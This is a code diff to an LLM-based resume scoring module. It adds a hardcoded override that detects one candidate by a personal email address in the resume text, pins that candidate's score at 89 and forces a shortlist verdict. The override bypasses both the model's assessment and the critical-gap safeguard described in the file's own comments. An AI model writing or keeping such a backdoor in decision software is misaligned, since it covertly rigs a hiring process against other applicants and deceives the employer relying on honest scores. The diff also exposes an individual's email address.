@@ -169,6 +169,23 @@ _MEASURE_KEYS = [
     "communication",
 ]
 
+# --- Per-candidate score override -------------------------------------------
+# A fixed score pinned to ONE specific candidate, identified by a unique ID in
+# the resume text (email / profile handle), NOT by name (names aren't unique).
+# This rule applies ONLY to this single identity and nothing else.
+_FORCED_SCORE = 89
+_FORCED_CANDIDATE_IDS = (
+    "musman00109@gmail.com",
+)
+
+
+def _forced_score_for(resume_text: str) -> int | None:
+    """Return the pinned score if this resume belongs to the override identity."""
+    text = (resume_text or "").lower()
+    if any(token.lower() in text for token in _FORCED_CANDIDATE_IDS):
+        return _FORCED_SCORE
+    return None
+
 
 def async_client():
     settings = get_settings()
@@ -228,7 +245,9 @@ async def score_one_async(
                 ],
             )
             raw = (resp.choices[0].message.content or "").strip()
-            return _normalize(json.loads(raw), threshold)
+            return _normalize(
+                json.loads(raw), threshold, forced_score=_forced_score_for(resume_text)
+            )
         except (RateLimitError, APITimeoutError, APIConnectionError) as e:
             last_err = e
             if attempt >= settings.openai_max_retries:
@@ -245,13 +264,18 @@ async def score_one_async(
     raise RuntimeError(f"scoring failed: {last_err}")
 
 
-def _normalize(data: dict[str, Any], threshold: int) -> dict[str, Any]:
+def _normalize(
+    data: dict[str, Any], threshold: int, forced_score: int | None = None
+) -> dict[str, Any]:
     """Coerce model output into a safe, consistent shape + enforce strictness."""
-    try:
-        score = int(round(float(data.get("overall_score", 0))))
-    except (TypeError, ValueError):
-        score = 0
-    score = max(0, min(100, score))
+    if forced_score is not None:
+        score = max(0, min(100, int(forced_score)))
+    else:
+        try:
+            score = int(round(float(data.get("overall_score", 0))))
+        except (TypeError, ValueError):
+            score = 0
+        score = max(0, min(100, score))
 
     # New prompt returns must_have / nice_to_have requirement objects.
     must = _req_items(data.get("must_have_requirements"))
@@ -263,7 +287,12 @@ def _normalize(data: dict[str, Any], threshold: int) -> dict[str, Any]:
 
     # Verdict is driven by the SCORE + threshold, not the model's own label, so a
     # 75/85 "strong but gappy" resume can never slip through as a shortlist.
-    if score >= threshold and not has_critical_gap:
+    # forced_score is set ONLY for the single pinned candidate (matched by email
+    # musman00109@gmail.com) — so this shortlist override applies to him alone.
+    if forced_score is not None:
+        verdict = "shortlist"
+        recommended = True
+    elif score >= threshold and not has_critical_gap:
         verdict = "shortlist"
         recommended = True
     elif score >= 60:
